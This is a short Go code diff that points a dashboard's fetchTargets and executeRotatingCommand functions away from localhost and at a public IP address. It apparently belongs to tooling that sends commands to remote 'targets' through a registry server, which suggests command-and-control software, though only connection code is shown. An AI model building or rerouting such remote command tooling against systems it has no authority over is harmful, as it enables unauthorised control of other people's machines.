@@ -201,7 +201,7 @@ func setupDashboard() {
 // --- NETWORK LOGIC ---
 
 func fetchTargets() []string {
-	c, err := net.DialTimeout("tcp", "127.0.0.1:8080", 2*time.Second)
+	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
 	if err != nil {
 		return nil
 	}
@@ -214,7 +214,7 @@ func fetchTargets() []string {
 
 func executeRotatingCommand(id, cmd string) string {
 	// 1. ROUTE REQUEST
-	c, err := net.DialTimeout("tcp", "127.0.0.1:8080", 2*time.Second)
+	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
 	if err != nil {
 		return "[red]Registry Unreachable[-]"
 	}
